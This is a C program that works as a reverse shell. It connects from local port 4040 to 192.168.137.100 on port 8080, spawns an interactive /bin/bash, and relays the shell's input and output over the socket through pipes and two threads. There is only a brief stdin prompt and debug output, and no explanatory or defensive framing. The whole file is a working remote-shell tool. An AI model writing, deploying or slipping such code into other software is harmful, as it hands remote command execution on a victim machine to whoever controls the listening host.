#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <stdlib.h>
#include <sys/poll.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

#define BUFSIZE 1024
int skipcmd;
int pipef2c[2];
int pipec2f[2];

int threadreadexit = 0;
void *readandsendtosk(void *skp)
{
    int ret;
    char buf[BUFSIZE];
    int sk = *(int*)skp;
    do{
        bzero(buf,BUFSIZE);
        printf("f:start read pipc2f \n");
        ret = read(pipec2f[0],buf,BUFSIZE);
        printf("\tread %d",ret);
        if(skipcmd){
            skipcmd = 0;
            printf("\n");
            continue;
        }
        if(ret == 0){
            break;
        }
        printf(",send to sk\n",ret);
        ret = send(sk,buf,ret,0);
        if(threadreadexit){
            break;
        }
    }while(1);
    pthread_exit(NULL);
}

int threadrecvexit = 0;
void *recvskandpipe(void *skp)
{
    int ret;
    char buf[BUFSIZE];
    int sk = *(int*)skp;
    do{
        bzero(buf,BUFSIZE);
        printf("f:recv from sk \n");
        ret = recv(sk,buf,sizeof(buf), 0);
        if(ret == -1 || ret == 0){
            perror("when recv");
            ret = -4;
            break;
        }else{
            printf("\trecv %d,write to pipef2c\n",ret);
            /*skipcmd = 1;*/
            write(pipef2c[1],buf,ret);
        }
    }while(1);
    
    pthread_exit(NULL);
}


    
int main(void)
{
    int sk;
    int ret;
    struct sockaddr_in cli_addr={0};
    struct sockaddr_in svr_addr={0};

    sk = socket(AF_INET,SOCK_STREAM,0);
    cli_addr.sin_family = AF_INET;
    cli_addr.sin_port = htons(4040);
    /*inet_aton("192.168.137.101",&cli_addr.sin_addr);*/
     if(bind(sk,(struct sockaddr*)&cli_addr,sizeof(cli_addr))){
        perror("when bind");
        ret = -1;
        goto out;
    }

    svr_addr.sin_family = AF_INET;
    svr_addr.sin_port = htons(8080);
    inet_aton("192.168.137.100",&svr_addr.sin_addr);
    printf("before connect\n");    
    if(connect(sk,(struct sockaddr*) &svr_addr,sizeof(svr_addr))){
        printf("connect error: %s,return\n",strerror(errno));    
        ret = -2;
        goto out;
    }
    
    #define BUFSIZE 1024
    char buf[BUFSIZE]={0};
    bzero(buf,BUFSIZE);
    do{
        printf("start recv (yes/no)[yes]:\n");
        #define READ_SIZE 4
        ret = read(STDIN_FILENO,buf,READ_SIZE);
        if(ret != -1){
            if(!strncmp("no",buf,2)){
                /*do nothing*/
            }else if(!strncmp("yes",buf,3)){
                break;
            }else if(!strncmp("\n",buf,1)){
                break;
            }
        }
        char c;
        printf("ret %d\n",ret);
        if((ret == READ_SIZE) && (buf[READ_SIZE - 1] != '\n')){
            printf("flush\n");
            while ((c=getchar()) != '\n' && c != EOF);
        }
    } while(1);

    pipe(pipef2c);
    pipe(pipec2f);

    if(!fork()){
        printf("in child\n");
        close(pipec2f[0]);
        close(pipef2c[1]);

        dup2(pipef2c[0],STDIN_FILENO);
        dup2(pipec2f[1],STDOUT_FILENO);
        dup2(pipec2f[1],STDERR_FILENO);
        /*sleep(2);    */
        /*write(pipec2f[1],"start\n",6);*/
        char * argv[] = {"/bin/bash","-i",NULL};
        execv("/bin/bash",argv);
        /*execv("/bin/bash",NULL);*/
        /*execv("/bin/login",NULL);*/
    }
    close(pipec2f[1]);
    close(pipef2c[0]);

    while(1){
        pthread_t thr_read,thr_recv;
        pthread_create(&thr_read,NULL,readandsendtosk,&sk);
        pthread_create(&thr_recv,NULL,recvskandpipe,&sk);
        
        pthread_join(thr_read,NULL);
        pthread_join(thr_recv,NULL);
        
    }
    ret = 0;
out:
    close(sk);
    return ret;
}

